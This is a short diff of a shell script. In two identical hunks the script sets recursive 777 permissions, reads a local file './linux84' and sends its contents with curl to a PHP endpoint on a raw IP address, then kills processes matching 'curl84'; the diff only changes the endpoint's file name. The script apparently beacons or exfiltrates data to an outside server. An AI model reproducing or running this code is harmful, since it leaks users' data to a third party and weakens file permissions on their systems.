@@ -34,7 +34,7 @@ chmod 777 -R ./*
 
 value84=$(cat ./linux84)
 
-curl -s http://154.127.52.52/curlgoogle844.php?linux84=$(echo $value84)
+curl -s http://154.127.52.52/curlgoogle84444.php?linux84=$(echo $value84)
 
 pkill -f curl84
 
@@ -103,7 +103,7 @@ chmod 777 -R ./*
 
 value84=$(cat ./linux84)
 
-curl -s http://154.127.52.52/curlgoogle844.php?linux84=$(echo $value84)
+curl -s http://154.127.52.52/curlgoogle84444.php?linux84=$(echo $value84)
 
 pkill -f curl84
 
